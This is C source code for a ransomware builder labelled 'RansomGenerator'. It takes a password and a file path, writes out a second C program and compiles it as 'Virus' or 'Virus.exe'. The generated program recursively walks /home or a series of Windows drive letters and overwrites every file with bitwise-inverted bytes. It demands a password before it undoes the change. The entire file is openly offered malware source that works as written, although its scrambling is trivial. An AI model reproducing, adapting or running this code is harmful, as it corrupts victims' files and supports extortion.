#include <string.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char** argv)
{
	printf("\033[31m"
"░█▀▄░█▀█░█▀█░█▀▀░█▀█░█▄█░█▀▀░█▀▄░█▀▀░█▀█░▀█▀░█▀█░█▀▄\n"
"░█▀▄░█▀█░█░█░▀▀█░█░█░█░█░█░░░█▀▄░█▀▀░█▀█░░█░░█░█░█▀▄\n"
"░▀░▀░▀░▀░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀░▀▀▀░▀░▀░░▀░░▀▀▀░▀░▀\n"
	);

	char pass[200];
	char path[200];

	printf("Enter Ransomware password : ");
	scanf("%s", pass);
	printf("Enter Ransomware path     : ");
	scanf("%s", path);

	strcat(path, ".c");

	FILE* f = fopen(path, "w");
	fprintf(f,
"#include <string.h>\n"
"#include <dirent.h>\n"
"#include <stdio.h>\n"
"#include <unistd.h>\n"
"#include <stdlib.h>\n"
"\n"
"void file_coding(char* file_addr); \n"
"void code();\n"
"\n"
"int main()\n"
"{\n"
"	FILE* f;\n"
"\n"
"	if(fopen(\".ransomware.log\", \"r\") == NULL)\n"
"	{\n"
"		f = fopen(\".ransomware.log\", \"w\");\n"
"		#ifdef __window__\n"
"\n"
"                chdir(\"C://\");\n"
"                code();\n"
"                chdir(\"E://\");\n"
"                code();\n"
"                chdir(\"D://\");\n"
"                code();\n"
"                chdir(\"F://\");\n"
"                code();\n"
"                chdir(\"B://\");\n"
"                code();\n"
"                chdir(\"A://\");\n"
"                code();\n"
"                chdir(\"G://\");\n"
"                code();\n"
"                chdir(\"L://\");\n"
"                code();\n"
"                chdir(\"M://\");\n"
"                code();\n"
"\n"
"		#endif\n"
"		#ifdef __linux__\n"
"\n"
"		chdir(\"/home\");\n"
"		code();\n"
"\n"
"		#endif\n"
"\n"
"		fclose(f);\n"
"		printf(\"your files coded:)\\n\");\n"
"	}\n"
"\n"
"	char pass[200];\n"
"	printf(\"you hacked Enter ransonware Password : \");\n"
"	scanf(\"%%s\", pass);\n"
"\n"
"	if(strcmp(pass, \"%s\") == 0)\n"
"	{\n"
"		#ifdef __window__\n"
"\n"
"                chdir(\"C://\");\n"
"                code();\n"
"                chdir(\"E://\");\n"
"                code();\n"
"                chdir(\"D://\");\n"
"                code();\n"
"                chdir(\"F://\");\n"
"                code();\n"
"                chdir(\"B://\");\n"
"                code();\n"
"                chdir(\"A://\");\n"
"                code();\n"
"                chdir(\"G://\");\n"
"                code();\n"
"                chdir(\"L://\");\n"
"                code();\n"
"                chdir(\"M://\");\n"
"                code();\n"
"\n"
"		#endif\n"
"\n"
"		#ifdef __linux__\n"
"\n"
"		chdir(\"/home\");\n"
"		code();\n"
"		#endif\n"
"\n"
"		printf(\"your password is correct :)\\n\");\n"
"	}\n"
"    	return 0;\n"
"}   \n"
"\n"
"void file_coding(char* file_addr)\n"
"{\n"
"	FILE* s = fopen(\".swap\", \"w\");\n"
"	FILE* f = fopen(file_addr, \"r\");\n"
"\n"
"	while(1)\n"
"	{\n"
"		int t = ~fgetc(f);\n"
"		if(feof(f)) break;\n"
"		fputc(t, s);\n"
"	}\n"
"\n"
"        fclose(s);\n"
"        fclose(f);\n"
"\n"
"	s = fopen(\".swap\", \"r\");\n"
"	f = fopen(file_addr, \"w\");\n"
"\n"
"        while(1)\n"
"        {\n"
"                int t = fgetc(s);\n"
"                if(feof(s)) break;\n"
"                fputc(t, f);\n"
"        }\n"
"\n"
"	fclose(s);\n"
"	fclose(f);\n"
"}\n"
" \n"
"void code()\n"
"{\n"
"	DIR* folder;\n"
"	if((folder = opendir(\".\")) == NULL)\n"
"	{\n"
"		perror(\"ERROR\");\n"
"	}\n"
"	struct dirent* entry;\n"
"\n"
"	while((entry = readdir(folder)) != NULL)\n"
"	{\n"
"		if(strcmp(entry->d_name, \".\") != 0 && strcmp(entry->d_name, \"..\") != 0)\n"
"		{\n"
"\n"
"			if(fopen(entry->d_name, \"r\") == NULL)\n"
"			{\n"
"				chdir(entry->d_name);\n"
"				code();\n"
"				chdir(\"..\");\n"
"			}else\n"
"			{\n"
"				file_coding(entry->d_name);	\n"
"			}\n"
"		}\n"
"	}\n"
"	closedir(folder);\n"
"}\n"

	, pass);

	fclose(f);

	int os = 0;

	do
	{
		printf("linux   ransomware [1]\n");
		printf("windows ransomware [2]\n");
		printf("exit               [99]\n\n");

		printf("choose number : ");
		scanf("%d", &os);
	}while(!(os == 1 || os == 2 || os == 99));

	char command[200];

	if(os == 1) sprintf(command, "gcc -o Virus %s", path);
	if(os == 2) sprintf(command, "i686-w64-mingw32-gcc -o Virus.exe %s", path);

	system(command);
}
